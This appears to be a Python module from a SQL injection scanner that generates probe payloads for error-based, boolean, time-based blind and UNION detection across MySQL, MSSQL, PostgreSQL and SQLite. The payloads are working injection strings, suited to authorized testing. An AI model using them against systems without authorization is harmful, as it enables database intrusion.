#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""Context-aware SQLi probe payloads."""

from __future__ import annotations

from typing import List, Tuple

from .injection_context import InjectionContext


def _string_boolean_fragments(ctx: InjectionContext) -> Tuple[str, str]:
    q = ctx.quote or "'"
    c = ctx.comment
    if ctx.paren_close:
        return (
            f" AND ({q}1{q}={q}1{c}".rstrip(),
            f" AND ({q}1{q}={q}2{c}".rstrip(),
        )
    return (
        f" AND {q}1{q}={q}1{c}".rstrip(),
        f" AND {q}1{q}={q}2{c}".rstrip(),
    )


def error_probes(ctx: InjectionContext) -> List[Tuple[str, str]]:
    """Return (payload, label) pairs for error-based detection."""
    base = ctx.original or "1"
    if ctx.numeric:
        return [
            (f"{base}'", "numeric stray quote"),
            (f"{base} AND 1=CONVERT(int,@@version)", "mssql convert"),
            (f"{base} AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))", "mysql extractvalue"),
        ]
    q = ctx.quote or "'"
    close = f"{base}{q}{ctx.paren_close}"
    return [
        (close, "quote close"),
        (ctx.append_sql(f" AND {q}1{q}={q}2"), "AND false string"),
        (ctx.append_sql(f" OR {q}x{q}={q}y"), "OR mismatch"),
    ]


def boolean_probes(ctx: InjectionContext) -> Tuple[Tuple[str, str], Tuple[str, str]]:
    """Return ((true_payload, true_label), (false_payload, false_label))."""
    if ctx.numeric:
        base = ctx.original or "1"
        return (
            (f"{base} AND 1=1", "numeric AND 1=1"),
            (f"{base} AND 1=2", "numeric AND 1=2"),
        )
    true_frag, false_frag = _string_boolean_fragments(ctx)
    return (
        (ctx.append_sql(true_frag), "AND true string"),
        (ctx.append_sql(false_frag), "AND false string"),
    )


def boolean_numeric_probes(original: str) -> Tuple[Tuple[str, str], Tuple[str, str], str]:
    """Legacy numeric probes; returns (true, false, numeric_base)."""
    numeric_base = original.strip() if original.strip().isdigit() else "1"
    ctx = InjectionContext(original=numeric_base, numeric=True, quote="")
    true_p, false_p = boolean_probes(ctx)
    return true_p, false_p, numeric_base


def time_probe(ctx: InjectionContext, delay: float, dbms: str = "") -> Tuple[str, str]:
    """Return (payload, label) for time-based blind detection."""
    delay_i = max(2, int(delay))
    db = (dbms or "").lower()

    if db == "postgresql":
        inner = f"(SELECT CASE WHEN (1=1) THEN pg_sleep({delay_i}) ELSE pg_sleep(0) END)"
        payload = ctx.append_sql(f" AND {inner}{ctx.comment}")
        return payload, f"pg_sleep({delay_i})"
    if db == "mssql":
        payload = ctx.append_sql(f"; WAITFOR DELAY '00:00:0{delay_i}'{ctx.comment}")
        return payload, f"WAITFOR DELAY {delay_i}s"
    if db == "sqlite":
        payload = ctx.append_sql(
            f" AND (SELECT CASE WHEN (1=1) THEN randomblob(100000000) ELSE 0 END){ctx.comment}"
        )
        return payload, "sqlite heavy"

    payload = ctx.append_sql(f" AND SLEEP({delay_i}){ctx.comment}")
    return payload, f"SLEEP({delay_i})"


def union_probe(ctx: InjectionContext, columns: int) -> Tuple[str, str]:
    """UNION SELECT with *columns* placeholders and a reflected hex marker."""
    cols = max(1, int(columns))
    parts = ["NULL"] * cols
    parts[0] = "0x4b535049"  # 'KSPI' hex marker
    select_list = ",".join(parts)
    payload = ctx.append_sql(f" UNION SELECT {select_list}{ctx.comment}")
    return payload, f"UNION {cols} cols"
